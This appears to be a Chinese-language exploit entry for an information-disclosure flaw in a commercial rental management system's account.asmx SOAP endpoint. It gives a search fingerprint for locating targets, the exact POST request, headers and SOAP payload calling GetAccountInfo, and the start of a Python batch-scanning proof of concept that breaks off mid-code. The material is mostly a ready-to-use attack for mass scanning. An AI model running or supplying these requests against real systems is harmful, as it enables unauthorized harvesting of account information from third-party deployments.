# 商业租赁管理系统account.asmx信息泄露漏洞

- **系统**：商业租赁管理系统account.asmx　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`title="商业租赁管理系统"`
- **请求**：`POST /rental/contract/api/account.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`SOAPAction: [http://tempuri.org/GetAccountInfo](http://tempuri.org/GetAccountInfo)`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetAccountInfo xmlns="http://tempuri.org/" />
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　—

**其他**
- Python: | 批量检测：<br/>python poc.py -f url.txt<br/>单个检测：<br/>python poc.py -u your-ip<br/><br/>import requests<br/>import urllib3<br/>from urllib.parse import urljoin,quote<br/>import argparse<br/>import ssl<br/>ssl._create_default_https_context = ssl._create_unverified_context<br/>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br/>def read_file(file_path):<br/>    with open(file_path,